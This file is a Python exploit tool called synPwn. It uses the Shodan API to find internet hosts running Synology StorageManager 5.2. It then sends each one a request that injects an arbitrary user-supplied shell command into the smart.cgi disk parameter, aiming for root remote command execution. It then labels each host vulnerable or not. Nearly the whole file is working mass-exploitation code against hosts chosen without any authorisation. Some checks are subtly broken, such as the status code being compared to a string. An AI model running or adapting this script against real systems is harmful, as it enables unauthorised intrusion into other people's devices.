#!/usr/bin/env python3
# Author: LukeBob
#
# Requires: argparse, shodan, requests pip install them if needed.
# Run with: python3 synPwn.py --key <Shodan API Key> --cmd "<Command to try and execute>"
#
# python3 script for testing the (Synology StorageManager 5.2 - Root Remote Command Execution) exploit found by, (Weibo: SecuriTeam_SSD Twitter: @SecuriTeam_SSD)
# Uses the shodan library to find the targets running synology and runs specified command given in --cmd param
# use, "python3 synpwn.py" -h ,for more help
# For more information on the exploit visit: https://www.exploit-db.com/exploits/43190/
#
# Note THIS SCRIPT CAN GET YOU IN ALOT OF TROUBLE, PROBABLY NOT WORTH THE HASTLE, ANYTHING YOU DO WITH THIS SCRIPT IS ON YOU'R BEHALF,
# AND YOUR'S ALONE!
#
# READ ^^^

import requests
import argparse
import shodan

parser = argparse.ArgumentParser(description="SynPwn, run remote code on Servers running 'Synology StorageManager 5.2'", epilog='Author: (Lukebob)')
parser.add_argument("--key", help='Shodan key')
parser.add_argument("--cmd", help='Command to run on system, if spaces in command wrap the command in quotes')
args = parser.parse_args()

## cloulors
class Color():
    @staticmethod
    def red(str):
        return("\033[91m" + str + "\033[0m")

    @staticmethod
    def green(str):
        return("\033[92m" + str + "\033[0m")

    @staticmethod
    def yellow(str):
        return("\033[93m" + str + "\033[0m")

    @staticmethod
    def blue(str):
        return("\033[94m" + str + "\033[0m")

## Creates New Shodan Api Object
def make_api(key):
    try:
        if len(key) > 1:
            api = shodan.Shodan(key)
            api.info()
        else:
            print(Color.red("[+] Error:")+" Please enter valid Api Key")
    except shodan.exception.APIError as e:
        print('[+] Error: %s' % e)
        exit(0)

    return(api)

## try's to run command on the target
def exploit(target):
    try:
        url = ("http://{0}/webman/modules/StorageManager/smart.cgi?action=apply&operation=quick&disk=/dev/sda'{1}''".format(target, args.cmd))
        r=requests.get(url)
        stat = r.status_code
        return(stat)
    except Exception as e:
        print(Color.red("[+] Error: ")+" {0}".format(e))
        pass

## itterates through targets printing vulnerable/invulnerable ip,hostname,countryname 
def search(api):
    try:
        results = api.search("Synology port:80")
    except shodan.APIError as e:
        print(Color.red("[+] Error: ")+"{0}".format(e))
        exit(0)

    for result in results['matches']:
        country  = result['location']['country_name']
        hostname = result['hostnames']
        target   = result['ip_str']
        result   = exploit(target)
        if result == "200":
            print("""
---------------------------------------------------------------------------------------
[Target {0}]\t[Hostname {1}]\t[Country {2}]\t[Command {3}]\t[{4}]
---------------------------------------------------------------------------------------
            """.format(Color.green(target), hostname, Color.red(args.cmd), Color.green("Vulnerable")))

        elif result != "200":
            print("""
---------------------------------------------------------------------------------------
[Target {0}]\t[Hostname {1}]\t[Country {2}]\t[Command {3}]\t[{4}]
---------------------------------------------------------------------------------------
            """.format(Color.green(target), hostname, Color.red(args.cmd), Color.red("Not Vulnerable")))

def main():

    if args.cmd and args.key:
        api = make_api(args.key)
        search(api)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
